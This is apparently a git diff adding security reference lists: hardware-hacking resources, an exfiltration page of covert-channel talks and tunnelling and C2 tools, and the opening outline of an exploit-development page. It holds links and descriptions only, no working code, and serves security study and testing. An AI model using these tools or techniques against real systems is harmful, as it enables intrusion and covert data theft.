+  * This is a project to modify the Sony Blu-ray BDP firmware. It started out
+    with only the BDP-S390, but has branched out to include other players and a
+    variety of goals, including removing Cinavia and obtaining Region-Free.
+
+* [Learn how to send an SMS text message in Python by pushing a button on your Arduino!](http://juliahgrace.com/intro-hardware-hacking-arduino.html)
+* [U-Boot -- the Universal Boot Loader](http://www.denx.de/wiki/U-Boot)
+
+  * Very popular on embedded devices open source bootloader for linux
+  * [Manual/Documentation](http://www.denx.de/wiki/DULG/Manual)
+
+### PCI
+
+* [Inception](https://github.com/carmaa/inception)
+
+  * Inception is a physical memory manipulation and hacking tool exploiting
+    PCI-based DMA. The tool can attack over FireWire, Thunderbolt, ExpressCard,
+    PC Card and any other PCI/PCIe interfaces. Inception aims to provide a
+    relatively quick, stable and easy way of performing intrusive and
+    non-intrusive memory hacks against live computers using DMA.
+
+* [Stupid PCIe Tricks featuring NSA Playset: PCIe](https://www.youtube.com/watch?v=Zwz61uVxiM0)
+* [PCILeech](https://github.com/ufrisk/pcileech)
+
+  * The PCILeech use the USB3380 chip in order to read from and write to the
+    memory of a target system. This is achieved by using DMA over PCI Express.
+    No drivers are needed on the target system. The USB3380 is only able to read
+    4GB of memory natively, but is able to read all memory if a kernel module
+    (KMD) is first inserted into the target system kernel. Reading 8GB of memory
+    from the target system take around one (1) minute. The PCILeech hardware is
+    connected with USB3 to a controlling computer running the PCILeech program.
+    PCILeech is also capable of inserting a wide range of kernel modules into
+    the targeted kernels - allowing for pulling and pushing files, remove the
+    logon password requirement, loading unsigned drivers, executing code and
+    spawn system shells. The software is written in visual studio and runs on
+    Windows 7/Windows 10. Supported target systems are currently the x64
+    versions of: Linux, FreeBSD, macOS and Windows.
+
+### Printers
+
+* [Hacking Printers Wiki](http://hacking-printers.net/wiki/index.php/Main_Page)
+* [Attacking _multifunction_ printers and getting creds from them](http://www.irongeek.com/i.php?page=videos/bsidescleveland2014/plunder-pillage-and-print-the-art-of-leverage-multifunction-printers-during-penetration-testing-deral-heiland)
+* [PRET](https://github.com/RUB-NDS/PRET)
+
+  * PRET is a new tool for printer security testing developed in the scope of a
+    Master's Thesis at Ruhr University Bochum. It connects to a device via
+    network or USB and exploits the features of a given printer language.
+    Currently PostScript, PJL and PCL are supported which are spoken by most
+    laser printers. This allows cool stuff like capturing or manipulating print
+    jobs, accessing the printer's file system and memory or even causing
+    physical damage to the device. All attacks are documented in detail in the
+    Hacking Printers Wiki.
+
+* [HPwn - HP printer security research code](https://github.com/foxglovesec/HPwn)
+
+  * This repository contains varios scripts and projects referenced in FoxGlove
+    security's HP printer blogpost.
+
+### USB
+
+* [USBProxy](https://github.com/dominicgs/USBProxy)
+
+  * A USB man in the middle device using USB On-The-Go, libUSB and gadgetFS
+
+* [Implementing an USB Host Driver Fuzzer - Daniel Mende - Troopers14](https://www.youtube.com/watch?v=h777lF6xjs4)
+* [WHID Injector: an USB-Rubberducky/BadUSB on Steroids](https://whid-injector.blogspot.lt/2017/04/whid-injector-how-to-bring-hid-attacks.html)
+* [Introduction to USB and Fuzzing - Matt DuHarte - Defcon23](https://www.youtube.com/watch?v=KWOTXypBt4E)
+* [Attacks via physical access to USB (DMA?)](https://security.stackexchange.com/questions/118854/attacks-via-physical-access-to-usb-dma)
+* [Can a connected USB device read all data from the USB bus?](https://security.stackexchange.com/questions/37927/can-a-connected-usb-device-read-all-data-from-the-usb-bus?rq=1)
+
+### Pentesting Drop Boxes
+
+* Minipwner
+* Pineapple
+* R00tabaga
+* Raspi
+* http://crushbeercrushcode.org/2013/03/developing-the-rogue-pi/
+* http://www.instructables.com/id/MyLittlePwny-Make-a-self-powered-pentesting-box-/
+* https://github.com/pwnieexpress/raspberry_pwn
+
+### Teensy/Rubbery Ducky Style Attacks/Etc
+
+* [USB teensy attack set OSX](http://samy.pl/usbdriveby/)
+* [Paensy](https://github.com/Ozuru/Paensy)
+
+  * Paensy is a combination of the word payload and Teensy - Paensy is an
+    attacker-oriented library written for the development of Teensy devices.
+    Paensy simplifies mundane tasks and allows an easier platform for scripting.
+
+* [Blogpost](http://malware.cat/?p=89)
+
+### SD Cards
+
+* [The Exploration and Exploitation of an SD Memory Card](https://www.youtube.com/watch?v=Tj-zI8Tl218)
+
+  * This talk demonstrates a method for reverse engineering and loading code
+    into the microcontroller within a SD memory card.
+
+### Tutorials/Walkthroughs/Write-ups
+
+* [Methodologies for Hacking Embedded Security Appliances](https://media.blackhat.com/us-13/US-13-Bathurst-Methodologies-for-Hacking-Embdded-Security-Appliances-Slides.pdf)
+* [Reversing D-Links WPS pin algorithm](http://www.devttys0.com/2014/10/reversing-d-links-wps-pin-algorithm/)
+* [Firmware Forensics: Diffs, Timelines, ELFs and Backdoors](http://w00tsec.blogspot.com/2015/02/firmware-forensics-diffs-timelines-elfs.html)
+* [Disk Genie - SpritesMods](http://spritesmods.com/?art=diskgenie)
+* [DRIVE IT YOURSELF: USB CAR](http://www.linuxvoice.com/drive-it-yourself-usb-car-6/)
+
+  * Reversing USB and writing USB Drivers for an RC car.
+
+* [Debug Probes - J-Link and J-Trace](https://www.segger.com/jlink-debug-probes.html)
+* [Analyzing and Running binaries from Firmware Images - Part 1](http://w00tsec.blogspot.com.br/2013/09/analyzing-and-running-binaries-from.html)
+* [Jailbreaks and Pirate Tractors: Reverse Engineering Dos and Donts](https://www.youtube.com/watch?v=8_mMTVsOM6Y)
+* [Lost your "secure" HDD PIN? We can help!](https://syscall.eu/pdf/2016-Lenoir_Rigo-HDD_PIN-paper.pdf)
+
+### USB
+
+* [USB in a Nutshell](http://www.beyondlogic.org/usbnutshell/usb1.shtml)
+
+  * Great explanation of the USB standard in depth
+
+* [USB Device Drivers: A Stepping Stone into your Kernel](https://www.youtube.com/watch?v=HQWFHskIY2)
+
+  * [Slides](www.jodeit.org/research/DeepSec2009_USB_Device_Drivers.pdf)
+
+* [Lowering the USB Fuzzing Barrier by Transparent Two-Way Emulation](https://www.usenix.org/system/files/conference/woot14/woot14-vantonder.pdf)
+
+  * Abstract: Increased focus on the Universal Serial Bus (USB) attack surface
+    of devices has recently resulted in a number of new vulnerabilities. Much of
+    this advance has been aided by the advent of hardware-based USB emulation
+    techniques. However, existing tools and methods are far from ideal,
+    requiring a significant investment of time, money, and effort. In this work,
+    we present a USB testing framework that improves significantly over existing
+    methods in providing a cost-effective and flexible way to read and modify
+    USB communication. Amongst other benefits, the framework enables
+    man-in-the-middle fuzz testing between a host and peripheral. We achieve
+    this by performing two-way emulation using inexpensive bespoke USB testing
+    hardware, thereby delivering capa-bilities of a USB analyzer at a tenth of
+    the cost. Mutational fuzzing is applied during live communication between a
+    host and peripheral, yielding new security-relevant bugs. Lastly, we comment
+    on the potential of the framework to improve current exploitation techniques
+    on the USB channel.
+
+* [USB For All - Defcon 22 - Jesse Michael and Mickey Shkatov](https://www.youtube.com/watch?v=7HnQnpJwr-c)
+
+  * USB is used in almost every computing device produced in recent years. In
+    addition to well-known usages like keyboard, mouse, and mass storage, a much
+    wider range of capabilities exist such as Device Firmware Update, USB
+    On-The-Go, debug over USB, and more. What actually happens on the wire? Is
+    there interesting data we can observe or inject into these operations that
+    we can take advantage of? In this talk, we will present an overview of USB
+    and its corresponding attack surface. We will demonstrate different tools
+    and methods that can be used to monitor and abuse USB for malicious
+    purposes.
+
+##### BadUSB
+
+* [Slides](https://srlabs.de/blog/wp-content/uploads/2014/11/SRLabs-BadUSB-Pacsec-v2.pdf)
+* [Video](https://www.youtube.com/watch?v=nuruzFqMgIw)
+* [Code - Psychson](https://github.com/adamcaudill/Psychson)
+* [Media Transfer Protocol and USB device Research](http://nicoleibrahim.com/part-1-mtp-and-ptp-usb-device-research/)
+
+##### USB Class Info
+
+* [USB Device Class Specifications - Official Site](http://www.usb.org/developers/docs/devclass_docs/)
+
+  * These specifications recommend design targets for classes of devices. For
+    HID related information, please go to the
+    [HID web page.](http://www.usb.org/developers/docs/docs/hidpage/)
+
+* [Universal Serial Bus Device Class Specification for Device Firmware Upgrade Version 1.1 Aug 5, 2004](http://www.usb.org/developers/docs/devclass_docs/DFU_1.1.pdf)
+* [USB Attacks Need Physical Access Right? Not Any More by Andy Davis](https://www.youtube.com/watch?v=90MIjgh5ESU)
+* [Phison PS2303 (PS2251-03) framework](https://bitbucket.org/flowswitch/phison)
+
+  * This project's goal is to turn PS2303-based USB flash drive into a cheap USB
+    3.0 development platform (i.e. fast USB 3.0 to FPGA bridge).
+
+### SIM Cards
+
+* [Rooting SIM cards](https://www.youtube.com/watch?v=BR0yWjQYnhQ)
+* [The Secret Life of SIM Cards - Karl Koscher/Eric Butler](https://www.youtube.com/watch?v=_-nxemBCcmU)
+* [Hacking a USB Modem & SIM](http://blog.ptsecurity.com/2014/12/4g-security-hacking-usb-modem-and-sim.html)
+
+### Smartcards
+
+* [ISO/IEC 7816](https://en.wikipedia.org/wiki/ISO/IEC_7816)
+* [ISO/IEC 15693](https://en.wikipedia.org/wiki/ISO/IEC_15693)
+* [ISO/IEC 14443](https://en.wikipedia.org/wiki/ISO/IEC_14443)
+* [How can I do that? Intro to hardware hacking with an RFID badge reader - Kevin Bong](http://www.irongeek.com/i.php?page=videos/derbycon3/3303-how-can-i-do-that-intro-to-hardware-hacking-with-an-rfid-badge-reader-kevin-bong)
+* [An analysis of the vulnerabilities introduced with Java Card 3 Connected Edition](http://www.ma.rhul.ac.uk/static/techrep/2013/MA-2013-04.pdf)
+* [Introduction to Smart Card Security](http://resources.infosecinstitute.com/introduction-smartcard-security/)
+
+* Chameleon Mini
+  * [Chameleon: A Versatile Emulator for Contactless Smartcards - Paper](https://www.ei.rub.de/media/crypto/veroeffentlichungen/2011/11/16/chameleon.pdf)
+  * [Milking the Digital Cash Cow [29c3] Video Presentation](https://www.youtube.com/watch?v=Y1o2ST03O8I)
+  * [ChameleonMini Hardware](https://github.com/emsec/ChameleonMini/wiki)
+
+---
+
+### General Papers
+
+* [Stealthy Dopant-Level Hardware Trojans](http://sharps.org/wp-content/uploads/BECKER-CHES.pdf)
+
+  * Abstract: In this paper we propose an extremely stealthy approach for
+    implement- ing hardware Trojans below the gate level, and we evaluate their
+    impact on the security of the target device. Instead of adding additional
+    cir- cuitry to the target design, we insert our hardware Trojans by changing
+    the dopant polarity of existing transistors. Since the modi ed circuit ap-
+    pears legitimate on all wiring layers (including all metal and polysilicon),
+    our family of Trojans is resistant to most detection techniques, includ- ing
+    ne-grain optical inspection and checking against \golden chips". We
+    demonstrate the e ectiveness of our approach by inserting Trojans into two
+    designs | a digital post-processing derived from Intel's cryp- tographically
+    secure RNG design used in the Ivy Bridge processors and a side-channel
+    resistant SBox implementation | and by exploring their detectability and
+    their e ects on security.
+
+* [Perimeter-Crossing Buses: a New Attack Surface for Embedded Systems](http://www.cs.dartmouth.edu/~sws/pubs/bgjss12.pdf)
+
+  * Abstract: This paper maps out the bus-facing attack surface of a modern
+    operating system, and demonstrates that effective and effcient injection of
+    traffc into the buses is real and easily a ordable. Further, it presents a
+    simple and inexpen-sive hardware tool for the job, outlining the
+    architectural and computation-theoretic challenges to creating a defensive
+    OS/driver architecture comparable to that which has been achieved for
+    network stacks.
+
+* [Implementation and Implications of a Stealth Hard-Drive Backdoor](https://www.ibr.cs.tu-bs.de/users/kurmus/papers/acsac13.pdf)
+
+  * Modern workstations and servers implicitly trust hard disks to act as
+    well-behaved block devices. This paper analyzes the catastrophic loss of
+    security that occurs when hard disks are not trustworthy. First, we show
+    that it is possible to compromise the firmware of a commercial ovt-the-shelf
+    hard drive, by resorting only to public information and reverse engineering.
+    Using such a compromised firmware, we present a stealth rootkit that
+    replaces arbitrary blocks from the disk while they are written, providing a
+    data replacement back- door . The measured performance overhead of the
+    compromised disk drive is less than 1% compared with a normal, non-malicious
+    disk drive. We then demonstrate that a re- mote attacker can even establish
+    a communication channel with a compromised disk to infiltrate commands and
+    to ex-filtrate data. In our example, this channel is established over the
+    Internet to an unmodified web server that relies on the compromised drive
+    for its storage, passing through the original webserver, database server,
+    database storage engine, filesystem driver, and block device driver.
+    Additional experiments, performed in an emulated disk-drive environment,
+    could automatically extract sensitive data such as /etc/shadow (or a secret
+    key le) in less than a minute. This paper claims that the diffculty of
+    implementing such an at- tack is not limited to the area of government
+    cyber-warfare; rather, it is well within the reach of moderately funded
+    criminals, botnet herders and academic researchers.
+
+* [Flipping Bits in Memory Without Accessing Them: An Experimental Study of DRAM Disturbance Errors](https://www.ece.cmu.edu/~safari/pubs/kim-isca14.pdf)
+
+  * Abstract. Memory isolation is a key property of a reliable and secure
+    computing system an access to one memory ad- dress should not have
+    unintended side e ects on data stored in other addresses. However, as DRAM
+    process technology scales down to smaller dimensions, it becomes more
+    diffcult to prevent DRAM cells from electrically interacting with each
+    other. In this paper, we expose the vulnerability of commodity DRAM chips to
+    disturbance errors. By reading from the same address in DRAM, we show that
+    it is possible to corrupt data in nearby addresses. More specifically,
+    activating the same row in DRAM corrupts data in nearby rows. We demonstrate
+    this phenomenon on Intel and AMD systems using a malicious program that
+    generates many DRAM accesses. We induce errors in most DRAM modules (110 out
+    of 129) from three major DRAM manufacturers. From this we conclude that many
+    deployed systems are likely to be at risk. We identify the root cause of
+    disturbance errors as the repeated toggling of a DRAM rows wordline, which
+    stresses inter-cell coupling e ects that accelerate charge leakage from
+    nearby rows. We provide an extensive characterization study of disturbance
+    errors and their behavior using an FPGA-based testing plat- form. Among our
+    key findings, we show that (i) it takes as few as 139K accesses to induce an
+    error and (ii) up to one in every 1.7K cells is susceptible to errors. After
+    examining var- ious potential ways of addressing the problem, we propose a
+    low-overhead solution to prevent the errors.
+
+* [Adapting Software Fault Isolation to Contemporary CPU Architectures](https://static.googleusercontent.com/media/research.google.com/en/us/pubs/archive/35649.pdf)
+
+  * Software Fault Isolation (SFI) is an effective approach to sandboxing binary
+    code of questionable provenance, an interesting use case for native plugins
+    in a Web browser. We present software fault isolation schemes for ARM and
+    x86-64 that provide control-flow and memory integrity with average
+    performance overhead of under 5% on ARM and 7% on x86-64. We believe these
+    are the best known SFI implementations for these architectures, with
+    significantly lower overhead than previous systems for similar
+    architectures. Our experience suggests that these SFI implementations
+    benefit from instruction-level parallelism, and have particularly small
+    impact for work- loads that are data memory-bound, both properties that tend
+    to reduce the impact of our SFI systems for future CPU implementations.
+
+* [Introduction to Trusted Execution Environments - Steven J. Murdoch](https://www.cl.cam.ac.uk/~sjm217/talks/rhul14tee.pdf)
+* [The Sorcerers Apprentice Guide to Fault Attacks](https://eprint.iacr.org/2004/100.pdf)
+
+  * The effect of faults on electronic systems has been studied since the 1970s
+    when it was noticed that radioactive particles caused errors in chips. This
+    led to further research on the effect of charged particles on silicon,
+    motivated by the aerospace industry who was becoming concerned about the
+    effect of faults in airborne electronic systems. Since then various
+    mechanisms for fault creation and propagation have been discovered and
+    researched. This paper covers the various methods that can be used to induce
+    faults in semiconductors and exploit such errors maliciously. Several
+    examples of attacks stemming from the exploiting of faults are explained.
+    Finally a series of countermeasures to thwart these attacks are described.
diff --git a/source/Exfiltration.md b/source/Exfiltration.md
new file mode 100644
index 0000000..ff90d4d
--- /dev/null
+++ b/source/Exfiltration.md
@@ -0,0 +1,276 @@
+# Exfiltration
+
+### TOC
+
+* [General](#general)
+* [Methodologies](#methods)
+* [Writeups](#writeups)
+* [Tools](#tools)
+* [Papers](#papers)
+
+### Cull
+
+### General
+
+* [HowTo: Data Exfiltration - windowsir.blogspot](https://windowsir.blogspot.com/2013/07/howto-data-exfiltration.html)
+* [Covert Channels in TCP/IP Protocol Stack - extended version-](https://eprints.ugd.edu.mk/10284/1/surveyAMBPselfArc.pdf)
+* [A Survey of Covert Channels and Countermeasures in Computer Network Protocols](http://caia.swin.edu.au/cv/szander/publications/szander-ieee-comst07.pdf)
+
+  * Covert channels are used for the secret transfer of information. Encryption
+    only protects communication from being decoded by unauthorised parties,
+    whereas covert channels aim to hide the very existence of the communication.
+    Initially, covert channels were identified as a security threat on
+    monolithic systems i.e. mainframes. More recently focus has shifted towards
+    covert channels in computer network protocols. The huge amount of data and
+    vast number of different protocols in the Internet seems ideal as a
+    high-bandwidth vehicle for covert communication. This article is a survey of
+    the existing techniques for creating covert channels in widely deployed
+    network and application protocols. We also give an overview of common
+    methods for their detection, elimination, and capacity limitation, required
+    to improve security in future computer networks.
+
+* [Covert Timing Channels Based on HTTP Cache Headers - Video Presentation](https://www.youtube.com/watch?v=DOAG3mtz7H4)
+
+  * [Covert Timing Channels Based on HTTP Cache Headers - Paper](https://scholarworks.rit.edu/cgi/viewcontent.cgi?filename=0&article=1784&context=other&type=additional)
+
+### Talks & Presentations
+
+* [Boston BSides - Simple Data Exfiltration in a Secure Industry Environment - Phil Cronin](https://www.youtube.com/watch?v=IofUpzYZNko)
+
+  * This presentaion explores the top 10 data exfiltration methods that can be
+    accomplished with only user-level privileges and that are routinely
+    overlooked in security-conscious industries.
+
+* [Emanate Like A Boss: Generalized Covert Data Exfiltration With Funtenna](https://www.youtube.com/watch?v=-YXkgN2-JD4)
+
+  * Funtenna is a software-only technique which causes intentional compromising
+    emanation in a wide spectrum of modern computing hardware for the purpose of
+    covert, reliable data exfiltration through secured and air-gapped networks.
+    We present a generalized Funtenna technique that reliably encodes and
+    emanates arbitrary data across wide portions of the electromagnetic
+    spectrum, ranging from the sub-acoustic to RF and beyond. The Funtenna
+    technique is hardware agnostic, can operate within nearly all modern
+    computer systems and embedded devices, and is specifically intended to
+    operate within hardware not designed to to act as RF transmitters. We
+    believe that Funtenna is an advancement of current state-of-the-art covert
+    wireless exfiltration technologies. Specifically, Funtenna offers comparable
+    exfiltration capabilities to RF-based retro-reflectors, but can be realized
+    without the need for physical implantation and illumination. We first
+    present a brief survey of the history of compromising emanation research,
+    followed by a discussion of the theoretical mechanisms of Funtenna and
+    intentionally induced compromising emanation in general. Lastly, we
+    demonstrate implementations of Funtenna as small software implants within
+    several ubiquitous embedded devices, such as VoIP phones and printers, and
+    in common computer peripherals, such as hard disks, console ports, network
+    interface cards and more.
+
+* [Data Exfiltration: Secret Chat Application Using Wi-Fi Covert Channel by Yago Hansen at the BSidesMunich 2017](https://www.youtube.com/watch?v=-cSu63s4zPY)
+* [Itzik Kotler | Goodbye Data, Hello Exfiltration - BSides Orlando](https://www.youtube.com/watch?v=GwaIvm2HJKc)
+
+  * Penetration testing isnt about getting in, its also about getting out with
+    the goodies. In this talk, you will learn how leverage commonly installed
+    software (not Kali Linux!) to exfiltrate data from networks. Moving on to
+    more advanced methods that combines encryption, obfuscation, splitting (and
+    Python). Last but not least, Ill address data exfiltration via physical
+    ports and demo one out-of-the-box method to do it.
+
+* [In Plain Sight: The Perfect Exfiltration Technique - Itzik Kotler and Amit Klein - HiTB2016](https://www.youtube.com/watch?v=T6PscV43C0w)
+
+  * In this session, we will reveal and demonstrate perfect exfiltration via
+    indirect covert channels (i.e. the communicating parties dont directly
+    exchange network packets). This is a family of techniques to exfiltrate data
+    (low throughput) from an enterprise in a manner indistinguishable from
+    genuine traffic. Using HTTP and exploiting a byproduct of how some websites
+    choose to cache their pages, we will demonstrate how data can be leaked
+    without raising any suspicion. These techniques are designed to overcome
+    even perfect knowledge and analysis of the enterprise network traffic.
+
+* [Can You Hear Me Now?!? Thoery of SIGTRAN Stego. BSidesPHX 2012](https://www.youtube.com/watch?v=vzpzL-UlpdA)
+
+  * Ever wanted to know how to communicate with someone and not be heard? As
+    many know, the internal cellular network uses SS7 and SIGTRAN to communicate
+    via out-of-band signalling. What many don't know is what can be done with
+    this. CC-MSOBS (Covert Channel via Multi-Streaming Out of Band Signalling)
+    is a new form of covert communication which can be utilized by taking
+    advantage of the multi-streaming aspects of SCTP and the using it with the
+    out-of-band signalling capabilities of SIGTRAN. Come explore this developing
+    covert channel as Drew Porter covers not only his idea but also his current
+    research on this new covert channel.
+
+* [Magnetic Side- and Covert-Channels using Smartphone Magnetic Sensors](https://www.youtube.com/watch?v=-LZJqRXZ2OM)
+
+  * Side- and covert-channels are unintentional communication channels that can
+    leak information about operations being performed on a computer, or serve as
+    means of secrete commination between attackers, respectively. This
+    presentation will discuss recent, new side- and covert-channels utilizing
+    smartphone magnetic sensors. In particular, our work on these channels has
+    shown that sensors outside of a computer hard drive can pick up the magnetic
+    fields due to the moving hard disk head. With these measurements, we are
+    able to deduce patterns about ongoing operations, such as detect what type
+    of the operating system is booting up or what application is being started.
+    Moreover, by inducing electromagnetic signals from a computer in a
+    controlled way, attackers can modulate and transmit arbitrary binary data
+    over the air. We show that modern smartphones are able to detect
+    disturbances in the magnetic field at a distance of dozen or more cm from
+    the computer, and can act as receivers of the transmitted information. Our
+    methods do not require any additional equipment, firmware modifications or
+    privileged access on either the computer (sender) or the smartphone
+    (receiver). Based on the threats, potential counter-measures will be
+    presented that can mitigate some of the channels.
+
+* [[DS15] Bridging the Air Gap Data Exfiltration from Air Gap Networks - Mordechai Guri & Yisroel Mirsky](https://www.youtube.com/watch?v=bThJEX4l_Ks)
+
+  * Air-gapped networks are isolated, separated both logically and physically
+    from public networks. Although the feasibility of invading such systems has
+    been demonstrated in recent years, exfiltration of data from air-gapped
+    networks is still a challenging task. In this talk we present GSMem, a
+    malware that can exfiltrate data through an air-gap over cellular
+    frequencies. Rogue software on an infected target computer modulates and
+    transmits electromagnetic signals at cellular frequencies by invoking
+    specific memory-related instructions and utilizing the multichannel memory
+    architecture to amplify the transmission. Furthermore, we show that the
+    transmitted signals can be received and demodulated by a rootkit placed in
+    the baseband firmware of a nearby cellular phone. We present crucial design
+    issues such as signal generation and reception, data modulation, and
+    transmission detection. We implement a prototype of GSMem consisting of a
+    transmitter and a receiver and evaluate its performance and limitations. Our
+    current results demonstrate its efficacy and feasibility, achieving an
+    effective transmission distance of 1-5.5 meters with a standard mobile
+    phone. When using a dedicated, yet affordable hardware receiver, the
+    effective distance reached over 30 meters.
+
+* [Inter VM Data Exfiltration: The Art of Cache Timing Covert Channel on x86 Multi-Core - Etienne Martineau](https://www.youtube.com/watch?v=SGqUGHh3UZM)
+
+  * On x86 multi-core covert channels between co-located Virtual Machine (VM)
+    are real and practical thanks to the architecture that has many
+    imperfections in the way shared resources are isolated. This talk will
+    demonstrate how a non-privileged application from one VM can ex-filtrate
+    data or even establish a reverse shell into a co-located VM using a cache
+    timing covert channel that is totally hidden from the standard access
+    control mechanisms while being able to offer surprisingly high bps at a low
+    error rate. In this talk youll learn about the various concepts, techniques
+    and challenges involve in the design of a cache timing covert channel on x86
+    multi-core such as: X86 shared resources and fundamental concept behind
+    cache line encoding / decoding. Getting around the hardware pre-fetching
+    logic ( without disabling it from the BIOS! ) Abusing the X86 clflush
+    instruction. Bi-directional handshake for free! Data persistency and noise.
+    What can be done? Guest to host page table de-obfuscation. The easy way, the
+    VMs vendors defense and another way to get around it. Phase Lock Loop and
+    high precision inter-VM synchronization. All about timers. At the end of
+    this talk we will go over a working VM to VM reverse shell example as well
+    as some surprising bandwidth measurement results. We will also cover the
+    detection aspect and the potential countermeasure to defeat such a
+    communication channel.
+
+* [Bridging the Air Gap Data Exfiltration from Air Gap Networks - DS15](https://www.youtube.com/watch?v=bThJEX4l_Ks)
+* [Covert Timing Channels Based on HTTP Cache Headers](https://www.youtube.com/watch?v=DOAG3mtz7H4)
+* [In Plain Sight: The Perfect Exfiltration Technique - Itzik Kotler and Amit Klein - HITB16](https://www.youtube.com/watch?v=T6PscV43C0w)
+
+### Writeups
+
+* [Data Exfiltration (Tunneling) Attacks against Corporate Network](https://pentest.blog/data-exfiltration-tunneling-attacks-against-corporate-network/)
+
+### Tools
+
+* [iodine](https://github.com/yarrick/iodine)
+
+  * This is a piece of software that lets you tunnel IPv4 data through a DNS
+    server. This can be usable in different situations where internet access is
+    firewalled, but DNS queries are allowed.
+
+* [dnscat2](https://github.com/iagox86/dnscat2)
+
+  * Welcome to dnscat2, a DNS tunnel that WON'T make you sick and kill you! This
+    tool is designed to create a command-and-control (C&C) channel over the DNS
+    protocol, which is an effective tunnel out of almost every network.
+
+* [fraud-bridge](https://github.com/stealth/fraud-bridge)
+
+  * fraud-bridge allows to tunnel TCP connections through ICMP, ICMPv6, DNS via
+    UDP or DNS via UDP6. Project, not stable
+
+* [PyExfil](https://ytisf.github.io/PyExfil/)
+
+  * Exfiltration tools inspired by Regin. Alpha Status.
+
+* [Exfil - Modular tool to test exfiltration techniques](https://github.com/averagesecurityguy/exfil)
+
+  * Exfil is a tool designed to exfiltrate data using various techniques, which
+    allows a security team to test whether its monitoring system can effectively
+    catch the exfiltration. The idea for Exfil came from a Twitter conversation
+    between @averagesecguy, @ChrisJohnRiley, and @Ben0xA and was sparked by the
+    TrustWave POS malware whitepaper available at
+    https://gsr.trustwave.com/topics/placeholder-topic/point-of-sale-malware/.
+
+* [Multitun](https://github.com/covertcodes/multitun)
+
+  * Efficiently and securely tunnel everything over a harmless looking
+    WebSocket!
+
+* [Data Exfiltration Toolkit(DET)](https://github.com/sensepost/det)
+
+  * DET (is provided AS IS), is a proof of concept to perform Data Exfiltration
+    using either single or multiple channel(s) at the same time. This is a Proof
+    of Concept aimed at identifying possible DLP failures. This should never be
+    used to exfiltrate sensitive/live data (say on an assessment) The idea was
+    to create a generic toolkit to plug any kind of protocol/service to test
+    implmented Network Monitoring and Data Leakage Prevention (DLP) solutions
+    configuration, against different data exfiltration techniques.
+
+* [canisrufus](https://github.com/maldevel/canisrufus)
+
+  * A stealthy Python based Windows backdoor that uses Github as a command and
+    control server
+
+* [Stunnel](https://www.stunnel.org/index.html)
+
+  * [Stunnel TLS Proxy](https://www.stunnel.org/static/stunnel.html)
+
+* [dnsftp](https://github.com/breenmachine/dnsftp)
+
+  * Client/Server scripts to transfer files over DNS. Client scripts are small
+    and only use native tools on the host OS.
+
+* [tcpovericmp](https://github.com/Maksadbek/tcpovericmp)
+
+  * TCP implementation over ICMP protocol to bypass firewalls
+
+* [icmptunnel](https://github.com/DhavalKapil/icmptunnel)
+
+  * Transparently tunnel your IP traffic through ICMP echo and reply packets.
+
+* [Outgoing port tester - http://letmeoutofyour.net/](http://letmeoutofyour.net/)
+
+  * [Outgoing port tester - portquiz.net](http://portquiz.net/)
+  * This server listens on all TCP ports, allowing you to test any outbound TCP
+    port.
+
+* [CloakifyFactory](https://github.com/TryCatchHCF/Cloakify)
+
+  * CloakifyFactory & the Cloakify Toolset - Data Exfiltration & Infiltration In
+    Plain Sight; Evade DLP/MLS Devices; Social Engineering of Analysts; Defeat
+    Data Whitelisting Controls; Evade AV Detection. Text-based steganography
+    usings lists. Convert any file type (e.g. executables, Office, Zip, images)
+    into a list of everyday strings. Very simple tools, powerful concept,
+    limited only by your imagination.
+
+### Papers
+
+* [Self-Exfiltration: The Dangers of Browser-Enforced Information Flow Control](http://ericchen.me/self_exfiltration.pdf)
+
+  * Abstract Since the early days of Netscape, browser vendors and web security
+    researchers have restricted out-going data based on its destination. The
+    security argument accompanying these mechanisms is that they prevent
+    sensitive user data from being sent to the attackers domain. However, in
+    this paper, we show that regulating web information flow based on its
+    destination server is an inherently flawed security practice. It is
+    vulnerable to self-exfiltration attacks, where an adversary stashes stolen
+    information in the database of a whitelisted site, then later independently
+    connects to the whitelisted site to retrieve the information. We describe
+    eight existing browser security mechanisms that are vulnerable to these
+    self-exfiltration attacks. Furthermore, we discovered at least one
+    exfiltration channel for each of the Alexa top 100 websites. None of the
+    existing information flow control mechanisms we surveyed are sufficient to
+    protect data from being leaked to the attacker. Our goal is to prevent
+    browser vendors and researchers from falling into this trap by designing
+    more systems that are vulnerable to self-exfiltration.
diff --git a/source/Exploit-Development.md b/source/Exploit-Development.md
new file mode 100644
index 0000000..f343c76
--- /dev/null
+++ b/source/Exploit-Development.md
@@ -0,0 +1,1755 @@
+# Exploit Development
+
+### TOC
+
+* [General Stuff/Techniques](#general)
+* [General Stuff I can't figure where else to put](#eh)
+* [Acquiring Old/Vulnerable Software](#acquire)
+* [Practice Exploit Dev/Structured Learning](#practice)
+* [Exploit Dev Papers](#expapers)
+* [bof](#bof)
+* [ROP](ROP)
+* BlindROP
+* SignalROP
+* JumpROP
+* [Heap](#heap)
+* [Format String](#fs)
+* [Integer Overflows](into)
+* [Null Ptr Dereference](#nullptr)
+* [JIT-Spray](#jit)
+* [ASLR](#aslr)
+* [Kernel Exploitation](#kernelex)
+* [Use After Free](#uaf)
+* [Other](#other)
+* [writing shellcode](#shellcode)
+* Windows Specific
+* Linux specific
+* [Tutorials](#tutorials)
+* [AV Bypass Methods](#avbypass)
+* [Bypassing Exploit Protections/Mitigations](#bypass-ep)
+* DEP/SEHop/ASLR
+* CFG/EMET
+* DeviceGuard
+* [Obfuscation](#obfuscation)
+* [ARM Specific things](#arm)
+* [Linux Specific](#linux)
+* [Windows Specific](#windows)
+* [Bypass SEH/SE-HOP; ](#SEH)
+* [Windows Heap Exploitation](#winheap)
+* [Anti Fuzzing](#antifuzz)
+* [Assembly](#asm)ASLR
+* [Anti Debugging](#antidebug)
+* [General Tools](#generaltools)
+* General
+* Hunting/Making Exploits
+* Shellcode
+* [Decompilers/Disassemblers](#decomp)
+* [Debuggers](#debug)
+* General
+* Linux
+* Windows
+* [General Papers](#papers)
+* [Miscellaneous Exploit Writeups](#miscex)
+* Talks
+* blogposts
+* Papers
+* [Attacking AV](#attackav)
+* [Finding Vulnerabilities](#finding)
+* [GPU Exploit/Research](#gpu)
+* [Building a lab to Practice Exploit Development](#lab)
+
+#### To Do
+
+* Sort tools better, like enviromental tools vs use-specific tools
+* Corelan Exploit Series
+* Add heap section
+
+#### Sort:
+
+* [BISC: Borrowed Instructions Synthetic Computation](https://github.com/trailofbits/bisc)
+
+  * BISC is a Ruby library for demonstrating how to build borrowed-instruction
+    programs. BISC aims to be simple, analogous to a traditional assembler,
